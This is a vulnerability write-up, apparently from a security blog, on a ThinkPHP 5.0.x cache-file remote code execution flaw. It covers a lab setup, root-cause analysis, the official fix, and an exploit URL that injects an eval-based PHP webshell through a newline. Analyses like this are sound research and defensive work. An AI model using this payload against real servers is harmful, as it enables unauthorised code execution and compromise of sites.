# ThinkPHP5.0.x Remote Code Execution

Author: H3rmesk1t

Data: 2021.08.16

# Vulnerability Summary
- This vulnerability exists in the cache class of ThinkPHP. This class will store cached data directly in .php files through serialization. The attacker can write webshells to the cache file through a carefully constructed payload. The name and directory of the cache file can be predicted. Once the cache directory can be accessed or contains vulnerabilities in combination with any file, it can trigger the remote code execution vulnerability.
- Vulnerability impact version:
5.0.0<=ThinkPHP5<=5.0.10

# Initial configuration
Get the test environment code

```bash
composer create-project --prefer-dist topthink/think=5.0.10 tpdemo
```
![Insert the picture description here](https://img-blog.csdnimg.cn/367b733b84ce4ed485b21e0afd629fa9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Set the require field of the composer.json file to the following

```bash
"require": {
    "php": ">=5.4.0",
    "topthink/framework": "5.0.10"
},
```

Then execute `composer update` and set the `application/index/controller/Index.php` file code as follows

![Insert the picture description here](https://img-blog.csdnimg.cn/6d3f889d805743e98da38af535401987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
<?php
namespace app\index\controller;
use think\Cache;
class Index
{
    public function index()
    {
        Cache::set("name",input("get.username"));
        return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:)</h1><pThinkPHP V5<br/><span style="font-size:30px">Ten years of hard work - A high-performance framework designed for API development</span></p><span style="font-size:22px;">[ V5.0 version is exclusively sponsored by <a href="http://www.qiniu.com" target="qiniu">Qiu Cloud</a]</span></div><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_bd568ce7058a1091"></thinkad>';
    }
}
?>
```
# Vulnerability Exploit

Payload

````bas
http://127.0.0.1/cms/public/index.php?username=H3rmesk1t%0d%0a@eval($_REQUEST[d1no]);//
```
![Insert the picture description here](https://img-blog.csdnimg.cn/b22f06b4988d4551aff167b951cd61d5.png#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/7a818445aaaf4618b4c73d39c01eddcf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability Analysis

Follow up on the `set` method of the `Cache` class, and found that it first created a class instance through the singleton pattern `init` method. The class is determined by the `cache` configuration item `type`. By default, its value is `File`. In this case, `self::$handler` is the `think\cache\driver\File` class instance

![Insert the picture description here](https://img-blog.csdnimg.cn/6d03e14650ec43808eb2f6cf3d2d4272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/5e9f26f0e86c4cf0a0b4d80b7059682a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/c4818b22818a404d88246d5fa9be73ef.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

In the `thinkphp/library/think/cache/driver/` directory, you can see several cache driver classes supported by Thinkphp5. Then in the above analysis, the program calls the `set` method of the `think\cache\driver\File` class. You can see that the `data` data has not been processed in any way, but is serialized and stitched in the file. The `$this->options['data_compress']` variable here is `false` by default, so the data will not be processed by the `gzcompress` function. Although a single line comment `//` is spliced ​​in front of the serialized data, we can bypass this restriction by injecting newline characters.

![Insert the picture description here](https://img-blog.csdnimg.cn/c608b06ace83450d93e3ed4050d754ba.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the image description here](https://img-blog.csdnimg.cn/d76f13392544417d9f3966bf1f141fea.png?x-oss-process=image/watermark,t
ype_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Let's see how the name of the cache file is generated. From the previous example, you can see that the file name is obtained by calling the `getCacheKey` method. Following up on this method, you can see that the subdirectory and file name of the cache file are related to the key set by the cache class (such as the key set by the cache class in this example is name). The program first obtains the `md5` value of the key name, and then uses the first `2` characters of the `md5` value as the cache subdirectory and the last 30 characters as the cache file name. If the application also sets the prefix `$this->options['prefix']` , then the cache file will have an additional directory.

![Insert the picture description here](https://img-blog.csdnimg.cn/bda2a2f3afaa4888911fd95d2284c389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

If this vulnerability is successfully exploited, you must know the key name set by the cache class so that you can find the `webshell` path; secondly, if you develop the program according to the official instructions, `webshell` will eventually be written to the `runtime` directory, and the official recommendation `public` is the web root directory, so even if you write `shell`, you cannot directly access it; finally, if the program has set `$this->options['prefix']`, you still cannot get the exact path of `webshell` without source code

# Vulnerability Fix

The official fix is: splice the data outside the `php` tag and splice the `exit()` function in the `php` tag

![Insert the picture description here](https://img-blog.csdnimg.cn/503b5156d7114ab982a5f6afb639546d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Attack summary

Refer to Master Mochazz's audit process

![Insert the picture description here](https://img-blog.csdnimg.cn/e5f1f064247d4bde85e8d6ca043f6b09.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)